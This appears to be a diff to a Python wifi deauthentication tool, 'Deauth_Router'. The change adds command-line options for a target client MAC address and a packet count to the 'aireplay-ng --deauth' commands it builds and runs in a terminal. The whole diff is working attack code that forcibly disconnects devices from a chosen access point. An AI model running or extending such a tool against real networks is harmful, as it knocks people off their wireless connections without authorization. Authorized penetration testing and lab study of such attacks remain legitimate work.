@@ -19,8 +19,16 @@ class Deauth_Router:
                              ]
           for _ in Snake_interface :
               set_airmon_snake = subprocess.call( _ ,shell=True,stderr=subprocess.PIPE,stdout=PIPE) 
-          command = "sudo aireplay-ng --deauth 0  -a "+f'{self.args.Deauth} '+" wlansnake "  
-         # command = " sudo mdk3 "+f"{self.args.Interface}"+"mon "+" d  -t "+  f'{self.args.Death} '   
+          if self.args.Target:
+               if not self.args.Packet:
+                  command = "sudo aireplay-ng --deauth 0  -a "+f'{self.args.Deauth} '+" -c "+f'{self.args.Target}'+" wlansnake "
+               else:
+                  command = "sudo aireplay-ng --deauth "+ f'{self.args.Packet}' " -a "+f'{self.args.Deauth} '+" -c "+f'{self.args.Target}'+" wlansnake "
+          else:
+              if not self.args.Packet:
+                 command = "sudo aireplay-ng --deauth 0  -a "+f'{self.args.Deauth} '+" wlansnake"
+              else:
+                  command = "sudo aireplay-ng --deauth " +f'{self.args.Packet}' +" -a "+f'{self.args.Deauth} '+" wlansnake"
           command_proc = ' gnome-terminal  -e ' +'"' +  command   +" --ignore-negative-one"+'"'                  
           call_termminal = subprocess.call(command_proc,shell=True,stderr=subprocess.PIPE)                            
       def args_Control(self):
@@ -28,6 +36,10 @@ class Deauth_Router:
             parser.add_argument( '-I ',"--Interface" )               
             parser.add_argument( '-D ',"--Deauth")
             parser.add_argument( '-AP ',"--APName")
+            parser.add_argument( '-T ',"--Target") 
+            parser.add_argument( '-P ',"--Packet")
+            
+            
             self.args = parser.parse_args()
             if len(sys.argv)> 1 :
                  pass
